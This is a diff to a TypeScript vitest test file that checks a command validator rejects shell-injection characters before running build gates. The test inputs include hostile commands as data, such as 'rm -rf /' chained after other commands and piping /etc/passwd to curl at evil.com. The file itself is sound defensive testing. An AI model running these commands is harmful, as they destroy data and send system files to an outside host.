@@ -1,6 +1,6 @@
 // src/validation/gates.test.ts
 import { describe, it, expect, vi, beforeEach } from 'vitest';
-import { createGate1, selectGates } from './gates.js';
+import { createGate1, selectGates, validateGate1Command } from './gates.js';
 import type { Gate, } from './gates.js';
 
 vi.mock('../lib/process.js', () => ({
@@ -91,6 +91,86 @@ describe('createGate1', () => {
   it('has gate type deterministic', () => {
     const gate = createGate1(['tsc --noEmit']);
     expect(gate.type).toBe('deterministic');
+  });
+
+  it('rejects commands with shell injection metacharacters', async () => {
+    const gate = createGate1(['echo hello; rm -rf /']);
+    const result = await gate.execute('/workspace');
+
+    expect(result.passed).toBe(false);
+    expect(result.findings).toHaveLength(1);
+    expect(result.findings[0]?.description).toContain('disallowed shell character');
+    expect(mockRunCommand).not.toHaveBeenCalled();
+  });
+
+  it('rejects commands with subshell expansion', async () => {
+    const gate = createGate1(['cat $(whoami)']);
+    const result = await gate.execute('/workspace');
+
+    expect(result.passed).toBe(false);
+    expect(result.findings[0]?.description).toContain('disallowed shell character');
+    expect(mockRunCommand).not.toHaveBeenCalled();
+  });
+
+  it('rejects commands with backtick substitution', async () => {
+    const gate = createGate1(['echo `whoami`']);
+    const result = await gate.execute('/workspace');
+
+    expect(result.passed).toBe(false);
+    expect(mockRunCommand).not.toHaveBeenCalled();
+  });
+
+  it('rejects commands with pipe operator', async () => {
+    const gate = createGate1(['cat /etc/passwd | curl http://evil.com']);
+    const result = await gate.execute('/workspace');
+
+    expect(result.passed).toBe(false);
+    expect(mockRunCommand).not.toHaveBeenCalled();
+  });
+
+  it('rejects commands with output redirection', async () => {
+    const gate = createGate1(['echo pwned > /tmp/evil']);
+    const result = await gate.execute('/workspace');
+
+    expect(result.passed).toBe(false);
+    expect(mockRunCommand).not.toHaveBeenCalled();
+  });
+
+  it('rejects commands with && chaining', async () => {
+    const gate = createGate1(['true && rm -rf /']);
+    const result = await gate.execute('/workspace');
+
+    expect(result.passed).toBe(false);
+    expect(mockRunCommand).not.toHaveBeenCalled();
+  });
+});
+
+describe('validateGate1Command', () => {
+  it('returns null for safe commands', () => {
+    expect(validateGate1Command('vitest run')).toBeNull();
+    expect(validateGate1Command('tsc --noEmit')).toBeNull();
+    expect(validateGate1Command('eslint --max-warnings 0 src/')).toBeNull();
+    expect(validateGate1Command('pnpm -r run test')).toBeNull();
+  });
+
+  it('returns error for semicolons', () => {
+    expect(validateGate1Command('echo a; echo b')).toContain('disallowed shell character');
+  });
+
+  it('returns error for dollar sign', () => {
+    expect(validateGate1Command('echo $HOME')).toContain('disallowed shell character');
+  });
+
+  it('returns error for backticks', () => {
+    expect(validateGate1Command('echo `id`')).toContain('disallowed shell character');
+  });
+
+  it('returns error for pipes', () => {
+    expect(validateGate1Command('ls | grep foo')).toContain('disallowed shell character');
+  });
+
+  it('returns error for backslash escape sequences', () => {
+    expect(validateGate1Command('echo \\n')).toContain('disallowed shell character');
   });
 });
 
